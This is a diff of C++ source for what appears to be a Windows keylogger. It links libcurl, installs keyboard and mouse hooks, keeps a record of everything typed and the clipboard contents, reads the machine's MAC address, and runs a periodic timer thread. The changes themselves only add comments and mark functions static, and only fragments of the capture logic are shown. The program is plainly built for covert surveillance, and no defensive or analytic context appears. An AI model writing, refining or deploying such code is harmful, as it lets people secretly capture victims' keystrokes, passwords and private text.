@@ -12,15 +12,19 @@
 
 #include "curl/curl.h"
 
+// Linking the libraries
 #ifdef _DEBUG
 #pragma comment(lib, "curl/libcurl_a_debug.lib")
 #else
 #pragma comment(lib, "curl/libcurl_a.lib")
 #endif
 
-#pragma comment(lib, "normaliz.lib") // normaliz.dll windows' library
+// user32 for the keyboard hook and the mouse hook
 #pragma comment(lib, "user32.lib") // user32.dll windows' library
+// ws2_32 for the network functions
 #pragma comment(lib, "ws2_32.lib") // ws2_32.dll windows' library
+// all these are for http requests and libcurl functions
+#pragma comment(lib, "normaliz.lib") // normaliz.dll windows' library
 #pragma comment(lib, "iphlpapi.lib") // iphlpapi.dll windows' library
 #pragma comment(lib, "advapi32.lib") // advapi32.dll windows' library
 #pragma comment(lib, "crypt32.lib") // crypt32.dll windows' library
@@ -87,7 +91,7 @@ std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
 std::string contentFile = ""; // save everything of what is been writing down
 
 // Keyboard hook
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
 	{
@@ -491,7 +495,7 @@ static void checkPossibleCopy(std::string& mess)
 }
 
 // Callback funciton for the mouseHook
-LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
+static LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	// Verifyng if the mouse event is a click
 	if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
@@ -516,7 +520,7 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 }
 
 // function to convert the MAC address from BYTE to string
-void MACToString(const BYTE* MACData, std::string& macStr) {
+static void MACToString(const BYTE* MACData, std::string& macStr) {
 	std::ostringstream oss;
 	for (int i = 0; i < 6; ++i) {
 		oss << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)MACData[i];
@@ -615,7 +619,7 @@ static std::string StartString()
 }
 
 // thread function
-void timeCheck() {
+static void timeCheck() {
 	std::string tmp;
 	while (true) {
 		// Wait x minutes
